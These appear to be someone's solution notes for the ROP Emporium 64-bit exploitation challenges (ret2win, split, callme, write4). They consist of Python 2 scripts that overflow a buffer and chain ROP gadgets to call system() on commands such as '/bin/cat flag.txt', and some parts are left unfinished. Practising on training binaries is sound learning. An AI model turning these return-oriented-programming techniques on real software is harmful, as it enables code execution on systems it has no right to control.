

### target

    https://ropemporium.com/ (64bit binaries)

### ret2win

    python2 -c 'import struct; print "A"*40 + struct.pack("<Q", 0x0000000000400811)' | ./ret2win

### split

```
cat > split.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

def rop():
    return "".join([
    struct.pack("<Q", 0x0000000000400883), # pop rdi ; ret
    struct.pack("<Q", 0x601060), # '/bin/cat flag.txt' location
    struct.pack("<Q", 0x400810) # call system()
    ])

payload = "A" * 40 + rop()

callme = os.popen('./split', 'w')
callme.write(payload)
EOF
```

### callme

```
cat > callme.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

def prepParams():
    return "".join([
    ])

def prepParams():
    return "".join([
    struct.pack("<Q", 0x0000000000401ab0), # pop rdi ; pop rsi ; pop rdx ; ret
    struct.pack("<Q", 0x1),
    struct.pack("<Q", 0x2),
    struct.pack("<Q", 0x3)
    ])

payload = "A" * 40 + \
           prepParams() + struct.pack("<Q", 0x401850) + \
           prepParams() + struct.pack("<Q", 0x401870) + \
           prepParams() + struct.pack("<Q", 0x401810)

callme = os.popen('./callme', 'w')
callme.write(payload)
EOF
```

### write4

```
cat > write4.py <<EOF
#! /usr/bin/env python2

import os
import sys
import socket
import struct
import telnetlib

### generic utilities

### specific data & functions

# address to write string to (beginning of .data section)
dest_addr = 0x601050

def callSystem(cmd_addr):
    return "".join([
    struct.pack("<Q", 0x0000000000400893), # pop rdi ; ret
    struct.pack("<Q", cmd_addr),
    struct.pack("<Q", 0x4005e0)
    ])

def write8(toAddr, value):
    return "".join([
    struct.pack("<Q", 0x400890), # pop r14 ; pop r15 ; ret
    struct.pack("<Q", toAddr),
    value,
    struct.pack("<Q", 0x400820), # mov qword ptr [r14], r15 ; ret
    ])

# TBD
def writeString(toAddr, string):
    return "".join([
    struct.pack("<Q", 0x0000000000401ab0), # pop rdi ; pop rsi ; pop rdx ; ret
    ])

payload = "A" * 40 + write8(dest_addr, '/bin//ls') + callSystem(dest_addr)

callme = os.popen('./write4', 'w')
callme.write(payload)
EOF
```
